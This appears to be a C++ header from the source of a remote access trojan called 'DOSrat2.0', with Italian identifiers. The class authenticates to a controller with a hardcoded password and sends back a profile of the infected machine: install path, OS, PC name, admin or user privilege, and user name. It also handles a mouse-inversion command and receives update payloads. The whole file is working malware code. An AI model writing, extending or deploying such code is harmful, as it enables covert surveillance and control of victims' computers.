#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	static bool Inizializzazione(SOCKET Sock)
	{
		DirUtils du;
		SystemUtils su;

		char Pass[10] = "DOSrat2.0";

		TcpIP::SetTimeout(10000, Sock);

		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		json data;

		data["InstallPath"] = du.GetFullModuleFilePath();
		data["OS"] = su.GetOS();
		data["PCname"] = su.GetPCName();
		data["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
		data["UserName"] = su.GetCurrentUser();
		data["Versione"] = Version;

		TcpIP::SendString(Sock, data.dump());

		return true;
	}

	static bool GetInfo(SOCKET Sock, string Str)
	{
		if (TcpIP::SendString(Sock, Str))
			return true;

		return false;
	}

	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
	{
		if (MouseStatus)
		{
			if (TcpIP::SendString(Sock, "a"))
				return true;
		}
		else
			if (TcpIP::SendString(Sock, "b"))
				return true;

		return false;
	}

	static string UpdateClient(SOCKET Sock)
	{
		string Buff = TcpIP::RecvString(Sock);

		if (Buff != "")
		{
			if (TcpIP::SendString(Sock, "OK"))
				return Buff;
			else
				return "";
		}
		else
		{
			TcpIP::SendString(Sock, "NO");
			
			return "";
		}

		return "";
	}
};